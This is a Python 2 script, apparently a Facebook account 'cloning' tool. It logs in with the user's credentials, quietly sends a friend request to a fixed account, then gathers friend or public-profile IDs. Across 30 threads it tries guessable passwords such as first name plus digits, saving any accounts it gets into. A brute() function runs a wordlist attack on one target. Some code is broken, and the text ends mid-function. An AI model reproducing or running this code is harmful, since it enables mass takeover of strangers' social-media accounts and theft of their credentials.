#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Tech-Qaiser
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
 
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()
 
 
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
 
    return cetak(d)
 
 
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
 
    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')
 
 
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)
 
 
logo = """
\033[0;35m╭━━━╮
\033[0;35m┃╭━╮┃
\033[0;35m┃┃╱┃┣━━┳┳━━┳━━┳━╮\033[0;31mUPDATED V+FIXED
\033[0;35m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
\033[0;35m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
\033[0;35m╰━━╮┣╯╰┻┻━━┻━━┻╯
\033[0;35m         ╰╯
 
\033[1;91m--> \033[4;3;92mGITHUB\033[1;0m :- \033[0;34mhttps://github.com/TechQaiser
 
\033[1;92m-->\033[4;3;92m FACEBOOK\033[1;0m :-\033[0;34m Qaiser Abbas
 
\033[1;93m--> \033[4;3;92mYOUTUBE\033[1;0m :-  \033[0;34mTech Qaiser
 
\033[1;94m--> \033[4;3;92mDISCLAIMER\033[1;0m:-\033[0;34m This Tool Is only for Educational Purposes I am not responsible for any miss use
 
 
"""
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\033[5;4;31m----------------While---------------w8' + o,
        sys.stdout.flush()
        time.sleep(1)
 
 
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print """
\033[0;35m╭━━━╮
\033[0;35m┃╭━╮┃
\033[0;35m┃┃╱┃┣━━┳┳━━┳━━┳━╮\033[0;31mUPDATED V+FIXED
\033[0;35m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
\033[0;35m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
\033[0;35m╰━━╮┣╯╰┻┻━━┻━━┻╯
\033[0;35m         ╰╯
 
\033[1;91m--> \033[4;3;92mGITHUB\033[1;0m :- \033[0;34mhttps://github.com/TechQaiser
 
\033[1;92m-->\033[4;3;92m FACEBOOK\033[1;0m :-\033[0;34m Qaiser Abbas
 
\033[1;93m--> \033[4;3;92mYOUTUBE\033[1;0m :-  \033[0;34mTech Qaiser
 
\033[1;94m--> \033[4;3;92mDISCLAIMER\033[1;0m:-\033[0;34m This Tool Is only for Educational Purposes I am not responsible for any miss use
 
 
"""
 
CorrectUsername = 'faizi'
CorrectPassword = 'here'
 
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[0;35m Enter Username\x1b[1;96m 🌠 ')
    if username == CorrectUsername:
        password = raw_input('\x1b[0;35m Enter Password\x1b[1;96m 🔒')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            loop = 'false'
        else:
            print 'Wrong Password'
            os.system('xdg-open https://youtu.be/bnitNSNYX5o')
    else:
        print 'Wrong Username'
        os.system('xdg-open https://youtu.be/bnitNSNYX5o')
##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	
        print "2.\x1b[1;95mLogin  Using Token"
        time.sleep(0.05)
        print "0.\033[1;95mExit           "
	    pilih_login()
	
def pilih_login():
	peak = raw_input("\n\033[1;92mChoose an Option>>> \033[1;94m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login()
	elif peak =="2":
	    tokenz()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()
		
def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        print '\x1b[1;96m[\xf0\x9f\x91\xbb]\x1b[1;91m\xf0\x9f\x94\xa5USE A FRESH ACCOUNT TO LOGIN\xf0\x9f\x94\xa5\x1b[1;96m[\xf0\x9f\x91\xbb]'
        id = raw_input('\x1b[1;96m[\xf0\x9f\x94\x90] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('\x1b[1;96m[\xf0\x9f\x94\x93] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mThere is no internet connection'
            keluar()
 
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;36;40m[\xe2\x9c\x93] Login Done \xf0\x9f\x94\x93\xe2\x9a\xa1'
                os.system('xdg-open https://www.youtube.com/channel/UCSBPlrPsjLLXC3HFFx9jl_Q')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] There is no internet connection'
                keluar()
 
        if 'checkpoint' in url:
            print '\n\x1b[1;92m[!] Your Account is on Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;93mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
 
 
def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
 
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\x1b[1;91mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;92mThere is no internet connection'
        keluar()
 
    os.system('clear')
    print logo
    print '   \x1b[1;33;92m\xe2\x98\x98\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x98\x98'
    print '   \x1b[1;36;40m\x1b[1;32;40m[*] Name\x1b[1;32;92m: ' + nama + '  \t   \x1b[1;36;40m'
    print '   \x1b[1;36;40m\x1b[1;34;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;92m'
    print '   \x1b[1;36;40m\x1b[1;34;40m[*] Subs\x1b[1;34;92m: ' + sub + '                      \x1b[1;36;92m'
    print '   \x1b[1;33;92m\xe2\x98\x98\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x98\x98'
    print "\x1b[1;32;98m[1] \x1b[1;33;98m\xf0\x9f\x94\x8d Let's start Cloning"
    print '\x1b[1;32;98m[0] \x1b[1;33;98m\xe2\x9d\x8c Log out'
    pilih()
 
 
def pilih():
    unikers = raw_input('\n\x1b[1;31;40m>>> \x1b[1;35;40m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        os.system('clear')
        print logo
        print ' \x1b[1;33;98m\xe2\x9c\xa8\xe2\x9a\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xf0\x9f\xa6\x81\xf0\x9f\xa6\x81\xf0\x9f\xa6\x81\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x9a\x9d\xe2\x9c\xa8\n'
        os.system('git pull origin master')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()
 
 
def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
 
    os.system('clear')
    print logo
    print '\x1b[1;32;92m[1] \x1b[1;33;98m\xf0\x9f\x91\x89 \xf0\x9f\x90\xafAttack From Friend List'
    print '\x1b[1;32;92m[2] \x1b[1;33;98m\xf0\x9f\x91\x89 \xf0\x9f\x90\xafAttack From Public ID'
    print '\x1b[1;32;92m[3] \x1b[1;33;98m\xf0\x9f\x91\x89 \xf0\x9f\x90\xafAttack From File'
    print '\x1b[1;32;36m[0] \x1b[1;33;96m\xe2\x80\xbc\xef\xb8\x8fBack'
    pilih_super()
 
 
def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;92m[\xf0\x9f\x94\x8d] Getting IDs \xe2\x9c\x94\xef\xb8\x8f \x1b[1;98m.')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
 
        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[*] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;37m[\xf0\x9f\x8c\x80] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;37m[\xf0\x9f\x8c\x80] ID Not Found!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                super()
 
            print '\x1b[1;35;37m[\xf0\x9f\x8c\x80] Getting ID '
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
 
        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
 
            except IOError:
                print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
                raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
                super()
 
        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_super()
        print '\x1b[1;36;96m[\xe2\x9a\x92\xef\xb8\x8f] Total IDs : \x1b[1;92m' + str(len(id))
        jalan('\x1b[1;34;96m[\xe2\x9a\x92\xef\xb8\x8f] Please Wait \xe2\x96\xb6\xef\xb8\x8f')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32;40m[\xf0\x9f\x90\xaf] Cloning\x1b[1;93m' + o,
            sys.stdout.flush()
            time.sleep(1)
 
    print '\n\x1b[1;94m        \xf0\x9f\x94\xb2     \x1b[1;91mBlackTiger To Stop Process Press CTRL+Z \x1b[1;94m    \xf0\x9f\x94\xb2'
    print '   \x1b[1;31;92m\xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
    jalan('         \x1b[1;92mCP ACCOUNT OPEN AFTER 7 DAYS')
    print '  \x1b[1;36;92m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
 
    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass
 
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = 'Pakistan'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
                cek = open('out/super_cp.txt', 'a')
                cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                    print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                    print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                        print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                        print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
                        cek = open('out/super_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = '786786'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                            print '\x1b[32;1m[\xe2\x9e\xb9] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                            print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '000786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
                                cek = open('out/super_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                    print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                    print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
        except:
            pass
 
    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
    print '\x1b[1;32;40m[+] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
    print '\n\x1b[1;31;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85\n           '
    raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
    super()
 
 
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;31;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\x1b[1;31;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
